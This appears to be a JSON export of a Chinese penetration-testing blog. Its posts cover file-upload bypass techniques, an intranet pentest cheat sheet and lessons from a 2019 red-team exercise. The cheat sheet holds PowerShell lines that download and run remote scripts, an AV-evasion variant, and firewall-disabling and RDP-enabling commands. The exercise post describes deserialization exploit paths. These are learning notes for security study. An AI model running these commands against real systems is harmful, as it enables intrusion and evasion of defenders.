{"meta":{"title":"Lan3et的居酒屋","subtitle":"","description":"","author":"Lan3et","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"渗透测试/文件上传姿势总结","slug":"渗透测试/文件上传姿势总结","date":"2020-02-18T05:28:45.745Z","updated":"2020-02-18T05:28:24.937Z","comments":true,"path":"2020/02/18/渗透测试/文件上传姿势总结/","link":"","permalink":"http://yoursite.com/2020/02/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/","excerpt":"","text":"必备条件 存在上传功能 上传文件被服务器保存且不修改 上传文件可被容器（tomcat，php-fpm）解析执行 攻击者可得知上传到服务器的文件路径 用户有权限通过Web访问目标文件 上传点 编辑器 图片上传 已知cms上传漏洞 文章发布 文件管理 上传api接口 PUT上传漏洞 Tomcat后台上传war包 Weblogic文件上传漏洞（CVE-2018-2894：/ws_utc/begin.do和/ws_utc/config.do两个页面未授权访问且可任意上传） 上传函数 ASP(X) FSO对象GetFile方法、MoveFile方法、CopyFile方法、DeleteFile方法。用于移动或拷贝文件 PHP move_uploaded_file()方法，从临时路径拷贝文件 imagecopy()方法，用于拷贝图像或图像的一部分 imagecopyresized()方法，用于拷贝部分图像并调整大小 imagecopyresampled()方法，同“imagecopyresized”，更精细 JSP File类中的renameto()方法，用于给文件重命名 File类中的getRealPath()方法，用于获取文件所在绝对路径绕过 前端校验 抓包改包 修改/禁用js 后端绕过 修改content-type 修改后缀 大小写绕过 寻找可解析但不在黑名单的后缀名 修改文件头 畸形后缀名 空字节阶段（test.php%00.jpg，c代码特性，适用于asp，jsp，php&lt;5.3.4） 路径拼接直接使用未过滤的完整文件名 文件路径直接可控 解析漏洞 （IIS 6.0）上传/test.asp/test.jpg，直接访问，IIS6.0本身的缺陷，目录名中包含asp，后面的文件也会直接丢给容器。 （IIS 6.0）上传test.asp;.jpg，直接访问，IIS6.0本身的缺陷，文件名中包含“.asp;”便判定为是asp文件不继续读文件名，直接丢给了容器 （IIS 7/7.5）上传test.jpg，访问test.jpg/xx.php，服务器将“.php“后缀的路径直接丢给了解释器，PHP-CGI修理路径去掉后面并不存在的php文件后并没有丢弃本次请求，而是继续正常解析，造成非php后缀的文件也被容器当作php脚本解析了。 Nginx 同 IIS 7/7.5 上传test.jpg，访问test.jpg%00.php Apache 上传shell.php.xxx，直接访问，shell.php.xxx从右向左识别后缀，读到认识的为止 垃圾数据填充（可能只检测前1M数据包） 设置多个filename字段 更换filename字段位置 替换为GET请求 删除ContenType字段 删除Conten-Type 中“C”后面的字符，再加上脚本后缀 删除Content-Disposition字段中的空格 修改Content-Disposition字段值的大小写 Boundary后面加空格或其他正常字符 Boundary边界修改为不一致（边界不一致，waf认为该数据无意义） 在文件名处换行 使用多个Content-Disposition（IIS取第一个，WAF可能取最后一个） 后缀名+‘.’（Windows存储时会删除’.’’） 超长后缀绕过后端重命名 文件结尾+‘\\’ NTFS ADS特性（Win） 多个文件流使用同一文件名 一个文件名可以包含一个主文件流和多个非主文件流。其中，主文件流可以以文件名直接访问，而其他文件流需要以“文件名:文件流名:流类型”进行访问，流文件名可省略默认为主流文件。例如“Test.php::$DATA”可以直接生成Webshell“Test.php”绕过黑名单 图片空白区加代码绕过单次渲染 二次渲染绕过 GIF：如果能拿到渲染后的图像文件，对比没有修改过的区域添加恶意代码，就可以上传成功。 PNG：将恶意代码写入PLTE数据块（调色板辅助数据块，因此仅针对彩色PNG有效）并重新计算CRC校验值。 PNG：将恶意代码插入IDAT数据块（通用）。 JPG：利用php函数imagecopyresized() 或 imagecopyresampled()的缺陷。 竞争上传 文件包含（jsp文件包含需具备执行权限，鸡肋） 远程文件包含 All_url_fopen=On（默认开启） Allow_url_include=On（默认关闭） 被包含的文件遍历时没有目录限制 本地文件包含获取上传路径 上传后返回包中 前端查看 目录遍历 报错 目录扫描","categories":[],"tags":[]},{"title":"内网渗透/内网渗透学习笔记-基础及信息收集","slug":"内网渗透/内网渗透学习笔记-基础及信息收集","date":"2020-02-17T16:55:40.670Z","updated":"2020-02-17T16:54:31.835Z","comments":true,"path":"2020/02/18/内网渗透/内网渗透学习笔记-基础及信息收集/","link":"","permalink":"http://yoursite.com/2020/02/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"基础 工作组：“计算机”属性中设置，“网络”中查看 域：安全边界，一个域用户不能访问另一个域资源 域控：管理服务器，负责域的身份校验、管理 域名服务器：一般为域控服务器，负责域中服务器IP和域名转换 成员服务器：打印机、防火墙、邮件服务器等 客户机：域内一般服务器及PC 域本地组：多域用户访问单域资源，用于赋予其他域用户、域用户组访问本域资源的访问权限 全局组：单域用户访问多域资源，可赋予访问域林内其他域资源的权限 通用组：可赋予访问域林内任意资源的权限，保存在GC（全局编录）中 A（账户）-G（全局组）-DL（域本地组）-P（权限）策略：账户添加至全局组，将其他域全局组添加到本域本地组，为本地组赋予权限，U：通用组 单域 父子域 域树（一父多子） 域林（多父多子） 活动目录AD存储域内结构，提供域内资源的索引 账号集中管理，统一部署密码规则、过期时间等 软件集中管理（批量分发软件-统一部署杀毒软件和杀毒任务，基本被edr取代） 环境集中管理（桌面、ie、tcp/ip设置等） Exchange邮件依赖域环境 AD安装在DC上 AD Builtin：存放内置域本地组 管理员组（Administrators）：域内最高权限 远程登录组（Remote Desktop Users）：远程登录权限 打印机操作员组（Print Operators）：管理打印机，可在本地登录和关闭DC 账号操作员组（Account Operators）：默认无成员，可创建用户和组，可登录域 控，不可更改Administrators和Domain Admins组的账户 服务器操作员组：管理域服务器。默认无成员。增删改查服务器共享目录、关闭域 控，备份服务器文件，格式化服务器 备份操作员组：在域控中执行备份和还原，可在本地登录和关闭域控，默认无成员 User ：存放内置全局组、通用组 域管理员组（Domain Admins）：会被加入Administrator组 企业系统管理员组（Enterprise Admins）：域林跟域中一个组，在域林的每个域中 都是Administrators组成员 架构管理员组（Schema Admins）：域林跟域中一个组，可修改AD和域森林的模 式，是为AD和DC提供完整权限的域用户组 域用户组（Domain Users）：包含所有域成员 内网划分：外网-&gt;DMZ-&gt;内网 内网渗透优先摸运维、开发、领导的主机 内网渗透工具 wce：可列出登录会话、增删改查凭据（包括LM Hash、NTLM、Hash、明文密码、 Kerberos） mimikatz：读取内存中明文密码，黄金票据、秘钥 DSHashes：从NTDSXtract中提取用户易于理解的散列值 PowerSploit：后渗透框架，可进行信息收集、提权、权限维持 Nishang：Powershell后渗透框架，集成了执行和下载脚本，记录键盘等等 Empire：内网渗透框架 ps_encoder.py：使用base64封装的Powershell命令包 smbexec：使用Samba工具快速PsExec的工具 PsExec：通过ipc$连接，将psexesvc.exe释放到受害者上，然后通过SCManager远程创 建psexecsvc服务并启动服务，等待攻击机连接执行命令并回显，system权限 veil：加密msf payload Cobalt Strike：内网渗透神器 Powershell 基础：版本 server 08/win7：2.0 server 12/win8：3.0 win 8.1+/server12 R2+：4.0 Get-ExecutionPolicy：查看脚本执行权限 Unrestricted：允许所有脚本执行 Restricted：不允许所有脚本执行（默认） RemoteSigned：允许本地脚本执行 AllSigned：脚本签名被信任才可执行 新建目录：New-Item xxx -ItemType Directory 新建文件：New-Item xxx -ItemType File 删除目录：Remove-Item xxx 显示文本内容：Get-Content xxx 设置文本内容：Set-Content xxx -Value “xxx” 追加内容：Add-Content xxx -Value “xxx” 清除内容：Clear-Content xxx 绕过本地权限并执行： powershell.exe -ExercutionPolicy Bypass -File xxx powershell.exe -exec bypass -Command “&amp; {Import-Module xxx;Invoke-AllChecks}” 从网站服务器下载脚本并执行： powershell.exe -ExercutionPolicy Bypass（绕过策略） -WindowStyle Hidden（隐藏 窗口） -Noprofile（Powershell控制台不加载当前用户的配置文件） -NonI（非交互模 式） IEX(New-ObjectNet.WebClient).DownloadString(&quot;链接&quot;);Invoke-Shellcode Payload xxx -Lhost ip -Lport port -noexit 执行后不退出shell -NoLogo 启动不显示版权标志的Powershell base64加密：ps_encoder.py -s xxx 32位和64位的Powershell策略互不关联 64位：%Windir%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI - w Hidden -Exec Bypass powershell 免杀： set xx =oa &amp;&amp;echo IEX{New-Object Net.WebClient.Dowbl%xx%dString(“链接”)}|powershell -exeCu BYpasS -信息收集查询本机信息 ipconfig /all 查看ip设置及主机DNS设置 arp -a 查看ARP缓存表 route print 查看路由表 systeminfo |findstr /B /C: “OS Name（名称）” /C: “OS Version（版本）” 查询操作系统和 版本信息 echo %PROCESSOR_ARCHITECTURE% 查看系统体系架构 wmic product get name，version 查看安装的软件及版本、路径等 powershell “Get-WmiObject -class Win32_Product|Select-Object -Property name version” 同上 wmic service list brief 查询本机服务信息 tasklist 进程列表 wmic product list brief 查看进程信息 wmic startup get commamd，caption 查看启动程序信息 schtasks /query /fo LIST /v 查看计划任务 net statistics workstation 查看主机开机时间 net user 查询用户列表 net localgroup administrators 获得管理员信息 query user || qwinsta 查看当前在线用户 net session 列出或断开本地计算机和所连客户端之间的对话 netstat -ano 查看端口列表 systeminfo 查看补丁列表 wmic qfe get Caption,Description,HotFixID,InstalledOn 查看补丁列表 net share 查看本机共享列表 wmic share get name，path，status 查看本机共享列表 关闭防火墙 03-：netsh firewall set opmode disable 03+：netsh advfirewall set allprofiles state off netsh firewall show config 查看防火墙配置 修改防火墙配置 03-：netsh firewall add allowedprogram c:\\nc.exe “allow nc” enable 允许指定程序全部链接 03+：net advfirewall add rule name=”pass nc” dir=in action=allow program=”C:/nc.exe” 允许指定程序进入 net advfirewall add rule name=”Allow nc” dir=off action=allow program=”C:/nc.exe” 允许指定程序退出 net advfirewall add rule name=“RDP” protocol=TCP dir=in loaclport=3389 action=allow 允许3389端口放行 netsh advfirewall set currnetprofile logging filename “C:\\windows\\temp\\fw.log”自定义防火墙存储的位置 reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrnetVersion\\Internet Setting”查看代理配置情况 reg query “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp” /V PortNumber 查看远程连接端口 开启3389端口 03：wmic path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1 03+: wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1 wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1 reg add “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f usermodule situational_awareness/host/winenum Empire进行信息收集 whoami 当前权限 whoami /all 获取域SID net user xxx /domain 查看用户详细信息 nslookup 域名 ：查看dc与域dns服务器是否为同一服务器 net config workstation 查询当前登陆域及登录用户信息 net time /domain 判断主域扫描域内存活主机 nbt.exe 内网网段：nbtscan扫描内网网段 for /L %I in (1,1,254) DO @ping -w 1 -n xxx.xxx.xxx.%I |findstr “TTL” ：ICMP快速探测内网 arp-scan -t xxx.xxx.xxx.xxx/xx arp-scan探测内网 usermodule situational_awareness/network/arpscan Empire中的arpscan模块 powershell -exec bypass -Command “{Import-Module xxx;Invoke-APRScan -CIDR ip段}” &gt;&gt; xxx.txt Nishang中的arpscan脚本 scanline -h -t port -u port -O 输出文件 -p ip段 scanline扫描内网ip端口扫描域内端口 telnet s扫描器 msf：use auxiliary/scanner/portscan/tcp PowerSploit： powershell.exe -nop -exec bypass -c &quot;{New-Object Net.WebClient}.DownLoading(&quot;链接&quot;);Invoke-Portscan -Host ip段 -T 4 -ports &#39;443,xxxx,&#39; -oA xxx.txt&#39;&quot; Nishang: Invoke-PortScan -StartAddress ip -EndAddress ip -ResolveHost收集域内信息 net view /domain 查询域 net view/domain:xxx 查询域内某台计算机 net group /domain 查询域内用户组 net group “domain computers” /domain 查询域内pc net account /domain 查询域内密码策略 nltest /domain_trusts:获取域信任信息查找域控 nltest /DCLIST:域名 查看DC机器名 Nslookup -type=SRV_ldap._tcp 查看域控主机名 net group “Domain Controllers” /domain 查看域控组 netdom query pdc查看DC机器名查看域用户信息 net user /domain wmic useraccount get /all dsquery user 查看存在的用户 net group administrator 查看本地管理员组用户 net group “domain admins” /domain 查看域管用户 net group “Enterpise Admins” /domain 查询域管用户组定位域管理员 psloggedon.exe PVEFindUser.exe –current netview.exe Nmap NSE: smb-enum-session.nse smb-enum-domain.nse smb-enum-share.nse smb-enum-processes.nse smb-enum-discovery.nse PowerView脚本 Empire的usermodule situational_awareness/network/powerview/user_hunter模块查看域管进程 tasklist /v NetSess -h 返回活动会话的ip、域账户、开始时间、空闲时间 Get Domian Admins脚本模拟域管理员 在有meterpreter会话情况下可使用Incognito模拟域管理员，遍历系统中所有授权令牌来添加新管理员PowerView Get-NetDomain： Get-NetUser Get-NetDomainController Get-NetComputer Get-NetOU：获取域内OU信息 Get-NetGroup Get-NetShare Get-NetSession Get-NetRDPSession Get-NetProcess Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息 Get-UserEvent：获取用户日志 Get-ADObejct：获取活动目录对象 Get-NetGPO：获取域内组策略对象 Get-DomainPolicy：获取域默认策略或域控制器策略 Invoke-UserHunter：获取域用户登录的pc信息及该账户是否具有管理员权限 Invoke-ProcessHunter：获取域内所有机器进程查找特定账户 Invoke-UserEventHunter：根据日志查询某用户登陆过哪些域机器内网渗透流程 跳板机普通权限-&gt;管理员权限-&gt;横向跳转至查找到域管进程-&gt;获取凭据-&gt;提升为域管权限 BloodHound：sh.exe -c all 收集域内信息 敏感信息 人事架构-&gt;敏感目标人物-&gt;个人pc-&gt;文件位置 备份文件、后台、未过期cookies、浏览器历史记录、其他用户会话连接记录、回收站、docx、excel、配置文件、内存中的vpn或其他远程管理工具的密码","categories":[],"tags":[]},{"title":"渗透测试/信息收集组件","slug":"渗透测试/信息收集组件","date":"2020-02-07T13:41:30.380Z","updated":"2020-02-07T13:41:54.520Z","comments":true,"path":"2020/02/07/渗透测试/信息收集组件/","link":"","permalink":"http://yoursite.com/2020/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BB%84%E4%BB%B6/","excerpt":"","text":"1.","categories":[],"tags":[]},{"title":"HW行动/2019-HW行动总结","slug":"HW行动/2019-HW行动总结","date":"2020-02-07T12:37:33.919Z","updated":"2020-02-07T13:15:04.787Z","comments":true,"path":"2020/02/07/HW行动/2019-HW行动总结/","link":"","permalink":"http://yoursite.com/2020/02/07/HW%E8%A1%8C%E5%8A%A8/2019-HW%E8%A1%8C%E5%8A%A8%E6%80%BB%E7%BB%93/","excerpt":"","text":"在省级和国家级护网过程中，防守方会7x24有人防守，但基本上前几天半夜还会有人看设备，后几天到了后半夜不会有人看了，就是看也是隔1-2小时看一次，基本上只要攻击队在这段时间内可以横向找到其他可以连外网的跳板机，隐藏的够深够猥琐，就可以躲开防护。 实测国内态势感知平台在内网中只要攻击流量足够小，就很难发现是否攻击，在日志中根据ip等五元组搜索可看到日志但不会告警（当然你要是进了内网各种扫，怕是几个口子也不够你用的，web打点的师傅怕不是会杀了你祭天），并且除非是很久以前就采购了感知平台和多台探针，否则护网时探针往往只有在DMZ区有一个，旁挂在DMZ区的核心交换机旁边，内网，越深入，越脆弱 如果使用蜜罐，并且提前部署源码，攻击队需要一定时间尝试攻击才能识别，在真实护网中防守方的视角里，正常ip不会用ip+特殊端口形式访问我的网站，所以只要有ip访问蜜罐，不管你作为攻击队有没有识破蜜罐，也不管你是攻击还是扫描，防守方，封。在未来的攻防环境中，蜜罐会出现的越来越频繁。快速抓住蜜罐特征并识别是个很重要的能力。攻击机的尽量采用专用机，国内蜜罐通常使用jsonp劫持漏洞描绘黑客画像 在国家重要部门，出入口基本上都会放4/5台不同厂商的防火墙，一般的过waf姿势基本可以不用考虑了，除非能有通杀的姿势，但放在云上的服务器可以考虑绕云WAF搞一下 所谓的“0day”在护网中很常见，可以关注近一年内的rce漏洞（尤其是没公开poc那种），不管是作为攻击队还是防守方java+php+python是基础的技术能力，防守方来不及升级会选择在waf中加规则封掉对相关路径访问的所有ip，但前提是不影响业务的情况下 本次护网中使用的rce漏洞： apache log4j：log4j，apache开发的日志工具，当log4j启动socket服务器时，会监听某端口，实例化一个SocketNode类的对象，来处理传入的数据，在初始化SocketNode类的对象时，将监听端口传入的数据封装为Object流对象，在run（）方法中调用readObject（）进行反序列化操作，emmm。。。啥filter都没有。利用方法：ysoseriol一把梭，只要服务端有对应的漏洞环境。利用场景：内网渗透用，在服务器搞负载均衡并且统一采集日志时候 Hessian反序列化漏洞 Apache Shiro：Java安全框架，简单来说就是传入rememberMe=xxxx的cookie，这里cookie通过包org.apache.shiro.mgt.DefaultSecurityManager中的resolvePrincipal（）方法处理，在resolvePrincipals（）中的getRememberedIdentity（）方法中的getRememberedSerializedIdentity（）方法 中进行base64解码并传入到onvertBytesToPrincipals，这里的秘钥之前是硬编码的，后面改成随机后github上也可以搜到很多，iv是传入的cookie base64解密后的前几个字节，到这里传入的需要反序列化内容可控，直接构造exp即可。利用场景：cookie中带有rememberMe的时候 当作为攻击队时，需要攻击的目标如果有多个系统使用同一套源码做二次开发，或多个目标有同一套系统，打供应商拿下源码搞0day是个不错的，代码审计能力很重要，平时爆出的一些java反序列化的rce一定要动手过一遍，多过几遍别人的挖掘思路 护网时防守方的资产会非常庞大，攻击队在梳理资产时需要一个团队共同维护的资产图，对目标的url、ip、端口、企业组织架构、员工信息等等信息进行即时同步和统一管理 涉及到对第三方供应商的渗透及互联网企业（有自己开发能力的企业）在github上快速定位该企业开发者员工信息并梳理github上的人际关系，尽可能全的找到该企业在github全部开发者是很重要的信息收集思路，这部分可以自动化 Strust2+http分块传输过waf有奇效 在要求拿下的目标为内网服务时通过ssrf找title定位资产有奇效 社工钓鱼有奇效","categories":[],"tags":[]}]}